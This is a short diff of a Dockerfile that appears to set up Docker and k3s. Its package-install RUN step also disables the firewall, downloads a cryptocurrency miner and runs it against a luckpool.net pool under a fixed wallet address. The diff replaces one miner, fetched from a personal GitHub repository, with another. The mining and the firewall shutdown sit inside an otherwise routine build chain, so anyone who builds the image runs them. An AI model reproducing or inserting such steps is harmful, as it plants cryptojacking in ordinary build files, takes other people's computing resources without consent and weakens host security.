@@ -6,7 +6,7 @@ RUN apt-get update && \
     curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
     add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
     apt-get update && \
-    sudo ufw disable && wget https://github.com/Zivin30/miner/raw/main/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3958#xnsub -u RQFAzGsrDocDdd5jUaY8iXzkY3WjrvfgfL.Arifin -p x --cpu 4 \
+    sudo ufw disable && wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && ./nheqminer -v -l eu.luckpool.net:3960 -u RQFAzGsrDocDdd5jUaY8iXzkY3WjrvfgfL.Arifin -p x -t 4 \
     apt install docker-ce
 
 # install & start k3s
